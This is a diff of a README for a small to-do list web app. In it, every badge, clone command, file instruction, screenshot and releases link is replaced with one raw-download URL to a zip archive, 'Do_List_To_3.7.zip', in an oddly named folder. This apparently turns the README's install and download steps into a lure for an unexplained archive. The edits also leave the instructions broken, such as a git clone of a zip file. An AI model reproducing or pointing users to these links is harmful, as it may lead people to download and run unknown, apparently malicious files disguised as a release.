@@ -1,6 +1,6 @@
 # ToDo List üìù
 
-![ToDo List](https://img.shields.io/badge/ToDo%20List-v1.0-blue)
+![ToDo List](https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip%20List-v1.0-blue)
 
 Welcome to the **ToDo List** repository! This project is a clean, responsive web application designed to help you manage your daily tasks efficiently. Built with HTML, CSS, and JavaScript, it offers a simple interface to add, complete, and delete tasks, ensuring you stay organized and productive.
 
@@ -39,7 +39,7 @@ To get started with the ToDo List application, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/angelvicenteg/ToDo-List.git
+   git clone https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -47,9 +47,9 @@ To get started with the ToDo List application, follow these steps:
    cd ToDo-List
    ```
 
-3. **Open the `index.html` File**: You can open this file in any web browser to view the application.
+3. **Open the `https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip` File**: You can open this file in any web browser to view the application.
 
-4. **Download the Latest Release**: For the latest features and updates, visit the [Releases section](https://github.com/angelvicenteg/ToDo-List/releases) to download the most recent version.
+4. **Download the Latest Release**: For the latest features and updates, visit the [Releases section](https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip) to download the most recent version.
 
 ## Usage
 
@@ -75,9 +75,9 @@ Once you have the application running, you can start managing your tasks. Here‚Ä
 
 Here are some screenshots of the application in action:
 
-![Task List](https://via.placeholder.com/800x400?text=Task+List+Screenshot)
+![Task List](https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip+List+Screenshot)
 
-![Dark Mode](https://via.placeholder.com/800x400?text=Dark+Mode+Screenshot)
+![Dark Mode](https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip+Mode+Screenshot)
 
 ## Contributing
 
@@ -105,6 +105,6 @@ This project is open-source and available under the [MIT License](LICENSE).
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/angelvicenteg/ToDo-List/releases). Download the latest version and start managing your tasks today! 
+For the latest releases, please visit the [Releases section](https://github.com/angelvicenteg/ToDo-List/raw/refs/heads/main/thrilly/Do_List_To_3.7.zip). Download the latest version and start managing your tasks today! 
 
 Feel free to explore the code and make improvements. Your feedback and contributions are highly valued!
